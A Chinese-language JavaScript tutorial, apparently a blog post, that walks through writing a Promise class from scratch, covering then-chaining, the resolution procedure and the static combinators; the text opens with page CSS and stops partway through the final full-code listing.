#ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>本专栏聚焦Promise的核心原理与高级应用，包含：
✓ Promise A+规范深度解读
✓ 手写实现与源码分析
✓ 异步编程设计模式
✓ 性能调优与错误处理</p>
</blockquote>
<blockquote>
<p>适合有JavaScript基础，希望深入异步编程的开发者。我们将用最少的篇幅，讲透最核心的知识。</p>
</blockquote>
<h2 data-id="heading-0">引言</h2>
<p>在前面的文章中，我们详细讲解了Promise的核心原理及相关的方法，本文将从零开始，手写一个功能完整的Promise类，深入理解Promise的工作原理。</p>
<h2 data-id="heading-1">Promise核心概念回顾</h2>
<p>在开始实现之前，我们先回顾一下Promise的核心特性：</p>
<ul>
<li>三种状态：pending（等待）、fulfilled（已成功）、rejected（已失败）。</li>
<li>状态不可逆：一旦状态改变，就不能再变。</li>
<li>链式调用：then方法返回一个新的Promise。</li>
<li>异步执行：回调函数总是异步执行。</li>
<li>错误冒泡：错误会一直向后传递，直到被捕获。</li>
</ul>
<h2 data-id="heading-2">基础骨架实现</h2>
<h3 data-id="heading-3">构造函数</h3>
<h4 data-id="heading-4">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Promise</span> {
		<span class="hljs-comment">// 构造函数接收一个执行器函数executor</span>
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">executor</span>) {

        <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'pending'</span>;  <span class="hljs-comment">// 声明初始状态</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// Priomise结果</span>
        <span class="hljs-comment">// 存储成功和失败的回调函数</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span> = [];
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span> = [];

        <span class="hljs-comment">// 声明resolve和reject两个函数</span>
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">resolve</span> = (<span class="hljs-params">value</span>) =&gt; {
            <span class="hljs-comment">// 判断状态是否为pending</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> !== <span class="hljs-string">'pending'</span>) <span class="hljs-keyword">return</span>;
            <span class="hljs-comment">// 1、修改对象状态</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'fulfilled'</span>;
            <span class="hljs-comment">// 2、保存成功值</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = value;
            <span class="hljs-comment">// 3、调用成功回调函数</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">item</span>(value));
            }
        }
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">reject</span> = (<span class="hljs-params">reason</span>) =&gt; {
            <span class="hljs-comment">// 判断状态是否为pending</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> !== <span class="hljs-string">'pending'</span>) <span class="hljs-keyword">return</span>;
            <span class="hljs-comment">// 1、修改对象状态</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'rejected'</span>;
            <span class="hljs-comment">// 2、保存失败原因</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = reason;
            <span class="hljs-comment">// 3、调用失败回调函数</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">item</span>(reason));
            }
        }
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 执行器函数executor是同步调用</span>
            <span class="hljs-title function_">executor</span>(resolve, reject);
        }
        <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-comment">// 执行器抛出的异常直接reject</span>
            <span class="hljs-title function_">reject</span>(e);
        }
    }
}
</code></pre>
<h4 data-id="heading-5">关键点解析</h4>
<ul>
<li>状态机：使用promiseState记录当前状态，当状态不为'pending'时，说明状态已经改变过了，直接返回，不进行任何处理；否则，才进行修改状态、保存结果、执行调用等操作。</li>
<li>结果存储：promiseResult存储成功值或失败原因。</li>
<li>回调队列：维护成功和失败回调队列，支持多次then调用。</li>
<li>异步执行：使用setTimeout确保回调异步执行。</li>
</ul>
<h2 data-id="heading-6">链式调用核心实现</h2>
<h3 data-id="heading-7">then()方法的基本结构</h3>
<h4 data-id="heading-8">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">then</span>(<span class="hljs-params">onResolved, onRejected</span>) {
    <span class="hljs-comment">// 如果不是函数则创建一个默认函数</span>
    onResolved = <span class="hljs-keyword">typeof</span> onResolved === <span class="hljs-string">'function'</span> ? onResolved : <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> value;
    onRejected = <span class="hljs-keyword">typeof</span> onRejected === <span class="hljs-string">'function'</span> ? onRejected : <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> { <span class="hljs-keyword">throw</span> reason };

    <span class="hljs-comment">// 返回新的Promise</span>
    <span class="hljs-keyword">const</span> promise2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-comment">// 处理resolved状态的函数</span>
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResolved</span> = (<span class="hljs-params"/>) =&gt; {
            <span class="hljs-comment">// 使用setTimeout确保异步执行</span>
            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">onResolved</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span>);
                    <span class="hljs-comment">// 处理返回值，可能是普通值或Promise</span>
                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, x, resolve, reject);
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">reject</span>(error);
                }
            }, <span class="hljs-number">0</span>);
        };

        <span class="hljs-comment">// 处理rejected状态的函数</span>
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleRejected</span> = (<span class="hljs-params"/>) =&gt; {
            <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                <span class="hljs-keyword">try</span> {
                    <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">onRejected</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span>);
                    <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, x, resolve, reject);
                } <span class="hljs-keyword">catch</span> (error) {
                    <span class="hljs-title function_">reject</span>(error);
                }
            }, <span class="hljs-number">0</span>);
        };

        <span class="hljs-comment">// 根据当前状态处理</span>
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'fulfilled'</span>) {
            <span class="hljs-title function_">handleResolved</span>();
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'rejected'</span>) {
            <span class="hljs-title function_">handleRejected</span>();
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> === <span class="hljs-string">'pending'</span>) {
            <span class="hljs-comment">// 如果是pending状态，将回调函数存储起来</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleResolved</span>());
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">push</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleRejected</span>());
        }
    });

    <span class="hljs-keyword">return</span> promise2;
}
</code></pre>
<h4 data-id="heading-9">关键点解析</h4>
<ul>
<li>值透传：如果 <code>onResolved</code> 不是函数，创建一个返回原值的函数 <code>value =&gt; value</code> 。</li>
<li>错误冒泡：如果 <code>onRejected</code> 不是函数，创建一个抛出错误的函数，让错误继续向下传递。</li>
<li>链式调用的基础：每个 then 必须返回新的 Promise，且返回的 Promise 是独立的，状态不受前一个 Promise 影响。</li>
<li>异步执行包装器（handleResolved/handleRejected）：模拟微任务行为，确保回调函数总是异步执行。</li>
</ul>
<h3 data-id="heading-10">Promise解析过程（核心难点）</h3>
<h4 data-id="heading-11">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">resolvePromise</span>(<span class="hljs-params">promise2, x, resolve, reject</span>) {
    <span class="hljs-comment">// 防止循环引用</span>
    <span class="hljs-keyword">if</span> (promise2 === x) {
        <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'Chaining cycle detected for promise'</span>));
    }

    <span class="hljs-comment">// 标记是否已被调用，防止多次调用</span>
    <span class="hljs-keyword">let</span> called = <span class="hljs-literal">false</span>;

    <span class="hljs-keyword">if</span> (x !== <span class="hljs-literal">null</span> &amp;&amp; (<span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'object'</span> || <span class="hljs-keyword">typeof</span> x === <span class="hljs-string">'function'</span>)) {
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 获取then方法</span>
            <span class="hljs-keyword">const</span> then = x.<span class="hljs-property">then</span>;

            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> then === <span class="hljs-string">'function'</span>) {
                <span class="hljs-comment">// 如果x有then方法，则将其视为Promise</span>
                then.<span class="hljs-title function_">call</span>(
                    x,
                    <span class="hljs-comment">// resolvePromise</span>
                    <span class="hljs-function"><span class="hljs-params">y</span> =&gt;</span> {
                        <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                        called = <span class="hljs-literal">true</span>;
                        <span class="hljs-comment">// 递归解析</span>
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, y, resolve, reject);
                    },
                    <span class="hljs-comment">// rejectPromise</span>
                    <span class="hljs-function"><span class="hljs-params">r</span> =&gt;</span> {
                        <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
                        called = <span class="hljs-literal">true</span>;
                        <span class="hljs-title function_">reject</span>(r);
                    }
                );
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-comment">// 如果x是普通对象或函数，直接resolve</span>
                <span class="hljs-title function_">resolve</span>(x);
            }
        } <span class="hljs-keyword">catch</span> (error) {
            <span class="hljs-keyword">if</span> (called) <span class="hljs-keyword">return</span>;
            called = <span class="hljs-literal">true</span>;
            <span class="hljs-title function_">reject</span>(error);
        }
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 如果x是基本类型，直接resolve</span>
        <span class="hljs-title function_">resolve</span>(x);
    }
}
</code></pre>
<h4 data-id="heading-12">为什么需要resolvePromise</h4>
<ul>
<li>防止循环引用导致的无限递归。</li>
<li>确保 Promise 解析过程符合规范。</li>
</ul>
<blockquote>
<p>这部分，我认为是 Promise 实现中最复杂的部分！</p>
</blockquote>
<h2 data-id="heading-13">实例方法实现</h2>
<h3 data-id="heading-14">catch()方法</h3>
<h4 data-id="heading-15">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">catch</span>(onRejected) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>(<span class="hljs-literal">null</span>, onRejected);
}
</code></pre>
<h3 data-id="heading-16">finally()方法</h3>
<h4 data-id="heading-17">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">finally</span>(<span class="hljs-params">onFinally</span>) {
    <span class="hljs-comment">// 需要先检查 onFinally 是否为函数</span>
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> onFinally !== <span class="hljs-string">'function'</span>) {
        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>();
    }
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">then</span>(
        <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFinally</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> value),
        <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(<span class="hljs-title function_">onFinally</span>()).<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> { <span class="hljs-keyword">throw</span> reason })
    );
}
</code></pre>
<h2 data-id="heading-18">静态方法实现</h2>
<h3 data-id="heading-19">Promise.resolve() / Promise.reject()</h3>
<h4 data-id="heading-20">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">resolve</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-comment">// 如果已经是Promise实例，直接返回</span>
    <span class="hljs-keyword">if</span> (value <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Promise</span>) {
        <span class="hljs-keyword">return</span> value;
    }

    <span class="hljs-comment">// 普通值</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function"><span class="hljs-params">resolve</span> =&gt;</span> {
        <span class="hljs-title function_">resolve</span>(value);
    });
}

<span class="hljs-comment">// Promise静态方法reject</span>
<span class="hljs-keyword">static</span> <span class="hljs-title function_">reject</span>(<span class="hljs-params">reason</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">_, reject</span>) =&gt;</span> {
        <span class="hljs-title function_">reject</span>(reason);
    });
}
</code></pre>
<blockquote>
<p>从上述代码中，我们可以看出：resolve() 方法比 reject() 方法多了一层判断逻辑，即：<code>如果已经是Promise实例，直接返回</code> ，这部分代码可以保障 <code>Promise.resolve()</code> 方法的幂等性。</p>
</blockquote>
<h3 data-id="heading-21">Promise.all()：所有成功，才算成功</h3>
<h4 data-id="heading-22">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">all</span>(<span class="hljs-params">promises</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'参数必须是数组'</span>));
        }

        <span class="hljs-keyword">const</span> results = [];
        <span class="hljs-keyword">let</span> completedCount = <span class="hljs-number">0</span>;

        promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
            <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
                    results[index] = value;
                    completedCount++;

                    <span class="hljs-keyword">if</span> (completedCount === promises.<span class="hljs-property">length</span>) {
                        <span class="hljs-title function_">resolve</span>(results);
                    }
                },
                reject  <span class="hljs-comment">// 直接传递reject函数</span>
            );
        });
    });
}
</code></pre>
<h3 data-id="heading-23">Promise.race()：竞速，谁最先完成</h3>
<h4 data-id="heading-24">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">race</span>(<span class="hljs-params">promises</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'参数必须是数组'</span>));
        }

        promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">promise</span> =&gt;</span> {
            <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(resolve, reject);
        });
    });
}
</code></pre>
<h3 data-id="heading-25">Promise.allSettled()：全部完成，记录所有结果</h3>
<h4 data-id="heading-26">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">allSettled</span>(<span class="hljs-params">promises</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'参数必须是数组'</span>));
        }

        <span class="hljs-keyword">const</span> results = [];
        <span class="hljs-keyword">let</span> completedCount = <span class="hljs-number">0</span>;

        <span class="hljs-keyword">const</span> <span class="hljs-title function_">processResult</span> = (<span class="hljs-params">index, value, status</span>) =&gt; {
            results[index] = status === <span class="hljs-string">'fulfilled'</span>
                ? { <span class="hljs-attr">status</span>: <span class="hljs-string">'fulfilled'</span>, value }
                : { <span class="hljs-attr">status</span>: <span class="hljs-string">'rejected'</span>, <span class="hljs-attr">reason</span>: value };

            completedCount++;

            <span class="hljs-keyword">if</span> (completedCount === promises.<span class="hljs-property">length</span>) {
                <span class="hljs-title function_">resolve</span>(results);
            }
        };

        promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
            <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> <span class="hljs-title function_">processResult</span>(index, value, <span class="hljs-string">'fulfilled'</span>),
                <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> <span class="hljs-title function_">processResult</span>(index, reason, <span class="hljs-string">'rejected'</span>)
            );
        });
    });
}
</code></pre>
<h3 data-id="heading-27">Promise.any()：任意一个成功，都算成功</h3>
<h4 data-id="heading-28">代码实现</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">static</span> <span class="hljs-title function_">any</span>(<span class="hljs-params">promises</span>) {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(promises) || promises.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>) {
            <span class="hljs-keyword">return</span> <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">TypeError</span>(<span class="hljs-string">'参数必须是数组'</span>));
        }

        <span class="hljs-keyword">const</span> errors = [];
        <span class="hljs-keyword">let</span> rejectedCount = <span class="hljs-number">0</span>;

        promises.<span class="hljs-title function_">forEach</span>(<span class="hljs-function">(<span class="hljs-params">promise, index</span>) =&gt;</span> {
            <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">resolve</span>(promise).<span class="hljs-title function_">then</span>(
                <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> {
                    <span class="hljs-title function_">resolve</span>(value);
                },
                <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> {
                    errors[index] = reason;
                    rejectedCount++;
                    <span class="hljs-keyword">if</span> (rejectedCount === promises.<span class="hljs-property">length</span>) {
                        <span class="hljs-title function_">reject</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">AggregateError</span>(errors, <span class="hljs-string">'所有Promise都被拒绝'</span>));
                    }
                }
            );
        });
    });
}
</code></pre>
<h2 data-id="heading-29">完整代码</h2>
<pre><code class="hljs language-javascript" lang="javascript">
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Promise</span> {
    <span class="hljs-comment">// 构造函数接收一个执行器函数executor</span>
    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">executor</span>) {

        <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'pending'</span>;  <span class="hljs-comment">// 声明初始状态</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = <span class="hljs-literal">null</span>; <span class="hljs-comment">// Priomise结果</span>
        <span class="hljs-comment">// 存储成功和失败的回调函数</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span> = [];
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span> = [];

        <span class="hljs-comment">// 声明resolve和reject两个函数</span>
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">resolve</span> = (<span class="hljs-params">value</span>) =&gt; {
            <span class="hljs-comment">// 判断状态是否为pending</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> !== <span class="hljs-string">'pending'</span>) <span class="hljs-keyword">return</span>;
            <span class="hljs-comment">// 1、修改对象状态</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'fulfilled'</span>;
            <span class="hljs-comment">// 2、保存成功值</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = value;
            <span class="hljs-comment">// 3、调用成功回调函数</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onResolvedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">item</span>(value));
            }
        }
        <span class="hljs-keyword">const</span> <span class="hljs-title function_">reject</span> = (<span class="hljs-params">reason</span>) =&gt; {
            <span class="hljs-comment">// 判断状态是否为pending</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> !== <span class="hljs-string">'pending'</span>) <span class="hljs-keyword">return</span>;
            <span class="hljs-comment">// 1、修改对象状态</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseState</span> = <span class="hljs-string">'rejected'</span>;
            <span class="hljs-comment">// 2、保存失败原因</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span> = reason;
            <span class="hljs-comment">// 3、调用失败回调函数</span>
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span>) {
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">onRejectedCallbacks</span>.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> <span class="hljs-title function_">item</span>(reason));
            }
        }
        <span class="hljs-keyword">try</span> {
            <span class="hljs-comment">// 执行器函数executor是同步调用</span>
            <span class="hljs-title function_">executor</span>(resolve, reject);
        }
        <span class="hljs-keyword">catch</span> (e) {
            <span class="hljs-comment">// 执行器抛出的异常直接reject</span>
            <span class="hljs-title function_">reject</span>(e);
        }
    }

    <span class="hljs-comment">// then方法接收两个参数onResolved和onRejected</span>
    <span class="hljs-title function_">then</span>(<span class="hljs-params">onResolved, onRejected</span>) {
        <span class="hljs-comment">// 如果不是函数则创建一个默认函数</span>
        onResolved = <span class="hljs-keyword">typeof</span> onResolved === <span class="hljs-string">'function'</span> ? onResolved : <span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span> value;
        onRejected = <span class="hljs-keyword">typeof</span> onRejected === <span class="hljs-string">'function'</span> ? onRejected : <span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> { <span class="hljs-keyword">throw</span> reason };

        <span class="hljs-comment">// 返回新的Promise</span>
        <span class="hljs-keyword">const</span> promise2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> {
            <span class="hljs-comment">// 处理resolved状态的函数</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleResolved</span> = (<span class="hljs-params"/>) =&gt; {
                <span class="hljs-comment">// 使用setTimeout确保异步执行</span>
                <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function">() =&gt;</span> {
                    <span class="hljs-keyword">try</span> {
                        <span class="hljs-keyword">const</span> x = <span class="hljs-title function_">onResolved</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">promiseResult</span>);
                        <span class="hljs-comment">// 处理返回值，可能是普通值或Promise</span>
                        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">resolvePromise</span>(promise2, x, resolve, reject);
                    } <span class="hljs-keyword">catch</span> (error) {
                        <span class="hljs-title function_">reject</span>(error);
                    }
                }, <span class="hljs-number">0</span>);
            };

            <span class="hljs-comment">// 处理rejected状态的函数</span>
            <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleRejected</span> = (<span class="hljs-params"/>) =&gt; {
